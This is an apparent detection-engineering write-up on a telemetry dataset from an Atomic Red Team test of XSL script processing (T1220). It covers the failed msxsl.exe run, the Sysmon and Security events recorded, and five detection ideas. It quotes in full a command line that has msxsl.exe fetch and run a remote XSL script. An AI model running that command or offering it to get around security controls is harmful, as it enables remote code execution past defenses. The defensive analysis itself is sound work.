# T1220-2: XSL Script Processing — MSXSL Bypass using remote files

## Technique Context

T1220 (XSL Script Processing) is a defense evasion technique where attackers execute arbitrary code by abusing XSLT (XSL Transformations) processors. Microsoft's MSXSL.EXE utility, originally designed for XML document transformations, can execute embedded script code within XSL stylesheets. This creates a powerful bypass mechanism since MSXSL is a legitimate Microsoft-signed binary that security controls often trust implicitly.

The detection community focuses heavily on MSXSL execution patterns, particularly when it processes remote files (as in this test variant) or when XSL files contain suspicious script blocks. The technique is attractive to attackers because it provides script execution through a trusted binary while appearing as legitimate document processing activity. Many detection strategies target the process chain (cmd.exe -> msxsl.exe), network connections to fetch remote XSL/XML files, and parent process relationships that indicate automation rather than user-initiated document processing.

## What This Dataset Contains

This dataset captures a failed execution attempt where MSXSL could not access the remote files. The primary evidence appears in Security event 4688, which shows the command line: `"cmd.exe" /c "C:\AtomicRedTeam\atomics\..\ExternalPayloads\msxsl.exe" "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml" "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"`. The cmd.exe process (PID 5396) exits with status 0x1, indicating failure.

Two Sysmon ProcessCreate events (EID 1) capture key process activity:
- whoami.exe execution (`"C:\Windows\system32\whoami.exe"`) triggered from PowerShell (PID 28304)
- cmd.exe execution with the full MSXSL command line spawned from the same PowerShell process

Process access events (Sysmon EID 10) show PowerShell accessing both whoami.exe and cmd.exe with full access rights (0x1FFFFF), suggesting process monitoring or interaction. The PowerShell channels contain only test framework boilerplate (Set-StrictMode, Set-ExecutionPolicy Bypass script blocks) without technique-specific content.

## What This Dataset Does Not Contain

Critically missing is a Sysmon ProcessCreate event for MSXSL.EXE itself. This absence, combined with cmd.exe's failure exit code, indicates that MSXSL execution was blocked or failed before process creation completed. The sysmon-modular configuration uses include-mode filtering for ProcessCreate events, but MSXSL.EXE should trigger detection rules if it executed successfully.

No network connection events (Sysmon EID 3) appear in the dataset, meaning MSXSL never established connections to fetch the remote XML/XSL files from GitHub. DNS query events (Sysmon EID 22) are also absent, confirming no name resolution occurred for raw.githubusercontent.com. File creation events for downloaded XML/XSL content are missing, and no Windows Defender block events appear in the Application log, suggesting the failure occurred at a different control point.

## Assessment

This dataset provides limited detection utility as it captures only the setup phase of T1220 execution, not the technique's actual implementation. The command-line evidence from Security 4688 events is valuable for signature-based detection of MSXSL usage patterns, particularly the characteristic dual-URL parameter structure for remote XML/XSL processing.

The process relationships visible in Sysmon events demonstrate typical PowerShell-based automation patterns that defenders should monitor. However, the lack of successful MSXSL execution, network activity, or script processing means this data doesn't represent the technique's core evasive capabilities or its typical behavioral footprint in real attacks.

For comprehensive T1220 detection development, you would need datasets showing successful MSXSL execution with network fetching, script processing, and payload delivery phases.

## Detection Opportunities Present in This Data

1. **MSXSL Command Line Pattern Detection** - Monitor Security 4688 events for cmd.exe processes executing MSXSL.EXE with dual URL parameters, particularly targeting raw.githubusercontent.com or other code hosting platforms

2. **PowerShell Process Spawning Anomalies** - Detect PowerShell processes spawning cmd.exe with external tool execution patterns, especially when command lines reference atomic testing frameworks or external payload directories

3. **Failed Execution Monitoring** - Track cmd.exe processes with exit code 0x1 following attempted execution of security testing tools, indicating potential blocked attack techniques

4. **Process Access Pattern Analysis** - Monitor for PowerShell processes accessing newly spawned cmd.exe children with full rights (0x1FFFFF), suggesting programmatic process control rather than normal user interaction

5. **Remote File Processing Attempt Detection** - Create signatures for command lines combining legitimate Microsoft utilities (MSXSL) with remote file URLs, regardless of execution success
